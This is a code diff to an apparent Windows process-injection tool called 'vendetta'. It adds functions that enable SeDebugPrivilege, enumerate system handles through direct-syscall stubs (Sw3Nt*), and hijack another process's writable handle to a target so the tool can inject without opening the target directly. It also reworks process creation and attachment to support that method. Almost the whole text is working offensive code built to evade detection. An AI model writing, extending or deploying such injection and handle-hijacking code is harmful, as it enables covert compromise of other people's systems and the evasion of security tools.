@@ -1,4 +1,6 @@
 #include "vendetta.h"
+
+#include <utility>
 #include "signatures.h"
 
 namespace vendetta
@@ -58,6 +60,70 @@ namespace vendetta
 			}
 			CloseHandle(hSnap);
 			return {};
+		}
+
+		bool EnableDebugPrivilege() {
+			HANDLE hToken;
+			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+				return false;
+
+			LUID luid;
+			if (!LookupPrivilegeValueW(nullptr, L"SeDebugPrivilege", &luid)) {
+				CloseHandle(hToken);
+				return false;
+			}
+
+			TOKEN_PRIVILEGES tp;
+			tp.PrivilegeCount = 1;
+			tp.Privileges[0].Luid = luid;
+			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+			if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr)) {
+				CloseHandle(hToken);
+				return false;
+			}
+
+			CloseHandle(hToken);
+			return (GetLastError() == ERROR_SUCCESS);
+		}
+
+		BYTE GetProcessObjectTypeIndex() {
+			HANDLE hSelf = GetCurrentProcess();
+			HANDLE hRealSelf = nullptr;
+			// Create a specific handle to ourselves to search for
+			Sw3NtDuplicateObject(GetCurrentProcess(), hSelf, GetCurrentProcess(), &hRealSelf, 0, 0, DUPLICATE_SAME_ACCESS);
+
+			ULONG size = 0x10000;
+			PSYSTEM_HANDLE_INFORMATION_EX info;
+			NTSTATUS status;
+			BYTE typeIndex = 0;
+
+			do {
+				info = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(VirtualAlloc(
+					nullptr, size, MEM_COMMIT, PAGE_READWRITE));
+				status = Sw3NtQuerySystemInformation(SystemExtendedHandleInformation, info, size, &size);
+				if (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH)) {
+					VirtualFree(info, 0, MEM_RELEASE);
+					size *= 2;
+				}
+			} while (status == STATUS_INFO_LENGTH_MISMATCH);
+
+			if (NT_SUCCESS(status) && info) {
+				DWORD myPID = GetCurrentProcessId();
+				for (ULONG_PTR i = 0; i < info->NumberOfHandles; i++) {
+					// Check if this entry matches our PID and our Handle value
+					if (info->Handles[i].UniqueProcessId == UlongToHandle(myPID) &&
+						info->Handles[i].HandleValue == hRealSelf) {
+
+						typeIndex = (BYTE)info->Handles[i].ObjectTypeIndex;
+						break;
+					}
+				}
+			}
+
+			if (info) VirtualFree(info, 0, MEM_RELEASE);
+			Sw3NtClose(hRealSelf);
+			return typeIndex;
 		}
 
 		PVOID FindSignature(const PROCESS_INFORMATION& pi,
@@ -526,6 +592,91 @@ namespace vendetta
 		return true;
 	}
 
+
+	HANDLE hijack_process_handle(const DWORD target_pid)
+	{
+		if (!EnableDebugPrivilege()) {
+			std::println("[-] Failed to grant SeDebug. Handle hijacking will not be available.");
+			return INVALID_HANDLE_VALUE;
+		}
+
+		BYTE processTypeIndex = GetProcessObjectTypeIndex();
+		if (processTypeIndex == 0) {
+			std::println("[-] Failed to resolve Process Object Type Index.");
+			return INVALID_HANDLE_VALUE;
+		}
+		std::println("[*] Process Type Index: {}", processTypeIndex);
+
+		ULONG buffer_size = 0x10000;
+		PSYSTEM_HANDLE_INFORMATION_EX handleInfo = nullptr;
+		NTSTATUS status;
+
+		do {
+			handleInfo = static_cast<PSYSTEM_HANDLE_INFORMATION_EX>(VirtualAlloc(
+				nullptr, buffer_size, MEM_COMMIT, PAGE_READWRITE));
+			if (!handleInfo) return INVALID_HANDLE_VALUE;
+
+			status = Sw3NtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, buffer_size, &buffer_size);
+		} while (std::cmp_equal(status, STATUS_INFO_LENGTH_MISMATCH));
+
+		if (!NT_SUCCESS(status) || !handleInfo) {
+			std::println("[-] Query failed: {:x}", status);
+			if (handleInfo) VirtualFree(handleInfo, 0, MEM_RELEASE);
+			return INVALID_HANDLE_VALUE;
+		}
+
+		auto hHijacked = INVALID_HANDLE_VALUE;
+
+		for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++) {
+			const auto& entry = handleInfo->Handles[i];
+
+			if (entry.UniqueProcessId == UlongToHandle(target_pid)) continue;
+			if (entry.UniqueProcessId == UlongToHandle(0) || entry.UniqueProcessId == UlongToHandle(4)) continue;
+
+			if (entry.ObjectTypeIndex != processTypeIndex) continue;
+
+			if ((entry.GrantedAccess & PROCESS_VM_WRITE) == 0) continue;
+
+			HANDLE hOwner = nullptr;
+			OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
+			CLIENT_ID clientId;
+
+			clientId.UniqueProcess = entry.UniqueProcessId;
+			clientId.UniqueThread = nullptr;
+
+			status = Sw3NtOpenProcess(&hOwner, PROCESS_DUP_HANDLE, &objAttr, &clientId);
+			if (!NT_SUCCESS(status)) continue;
+
+			HANDLE hDup = nullptr;
+			status = Sw3NtDuplicateObject(
+				hOwner,
+				entry.HandleValue,
+				GetCurrentProcess(),
+				&hDup,
+				0,
+				0,
+				DUPLICATE_SAME_ACCESS
+			);
+
+			Sw3NtClose(hOwner);
+
+			if (NT_SUCCESS(status)) {
+				// Verify
+				if (GetProcessId(hDup) == target_pid) {
+					std::println("[+] Hijacked handle from PID: {} (Handle: {:p}, Access: {:x})",
+						reinterpret_cast<uintptr_t>(entry.UniqueProcessId), static_cast<PVOID>(entry.HandleValue), static_cast<unsigned int>(entry.GrantedAccess));
+
+					hHijacked = hDup;
+					break;
+				}
+				Sw3NtClose(hDup);
+			}
+		}
+
+		VirtualFree(handleInfo, 0, MEM_RELEASE);
+		return hHijacked;
+	}
+
 	injector::~injector()
 	{
 		if (pi_.hThread && pi_.hThread != INVALID_HANDLE_VALUE)
@@ -536,10 +687,10 @@ namespace vendetta
 				pi_.hProcess);
 	}
 
-	bool injector::create_dummy_process(const bool create_suspended)
+	bool injector::create_process(const LPCSTR& benign_dll, const bool create_suspended)
 	{
 		if (!CreateProcessA(
-			R"(..\dummy\dummy.exe)",
+			benign_dll,
 			nullptr, nullptr, nullptr, FALSE,
 			create_suspended ? CREATE_SUSPENDED : 0,
 			nullptr, nullptr, &si_, &pi_))
@@ -551,37 +702,45 @@ namespace vendetta
 		return true;
 	}
 
-	bool injector::attach_to_process(const DWORD pid)
+	bool injector::attach_to_process(const DWORD pid, const retrieve_handle_method handle_method)
 	{
 		pi_.dwProcessId = pid;
 
-		CLIENT_ID client_id;
-		client_id.UniqueProcess = UlongToHandle(pi_.dwProcessId);
-		client_id.UniqueThread = nullptr;
-
-		OBJECT_ATTRIBUTES obj_attr = { 0 };
-		obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);
-
-		NTSTATUS status = Sw3NtOpenProcess(
-			&pi_.hProcess, PROCESS_ALL_ACCESS, &obj_attr,
-			&client_id);
-		if (!NT_SUCCESS(status))
+		switch (handle_method)
 		{
-			std::println("[-] Sw3NtOpenProcess failed. Error = {}",
-				status);
-			return false;
-		}
-		if (pi_.hProcess == INVALID_HANDLE_VALUE)
+		case hijack_handle:
+			pi_.hProcess = hijack_process_handle(pid);
+			break;
+		case open_handle:
+			CLIENT_ID client_id;
+			client_id.UniqueProcess = UlongToHandle(pi_.dwProcessId);
+			client_id.UniqueThread = nullptr;
 
-		{
-			std::println("[-] OpenProcess failed. Error = {}",
-				GetLastError());
-			return false;
+			OBJECT_ATTRIBUTES obj_attr = { 0 };
+			obj_attr.Length = sizeof(OBJECT_ATTRIBUTES);
+
+			NTSTATUS status = Sw3NtOpenProcess(
+				&pi_.hProcess, PROCESS_ALL_ACCESS, &obj_attr,
+				&client_id);
+			if (!NT_SUCCESS(status))
+			{
+				std::println("[-] Sw3NtOpenProcess failed. Error = {}",
+					status);
+				return false;
+			}
+			if (pi_.hProcess == INVALID_HANDLE_VALUE)
+
+			{
+				std::println("[-] OpenProcess failed. Error = {}",
+					GetLastError());
+				return false;
+			}
+			break;
 		}
 		return true;
 	}
 
-	bool injector::attach_to_process_by_name(const std::wstring& process_name)
+	bool injector::attach_to_process_by_name(const std::wstring& process_name, const retrieve_handle_method handle_method)
 	{
 		std::string process_name_str(process_name.begin(),
 			process_name.end());
@@ -620,7 +779,7 @@ namespace vendetta
 			return false;
 		}
 
-		attach_to_process(pe32.th32ProcessID);
+		attach_to_process(pe32.th32ProcessID, handle_method);
 		std::println("[+] Attached to {}. PID = {}.", process_name_str,
 			pe32.th32ProcessID);
 
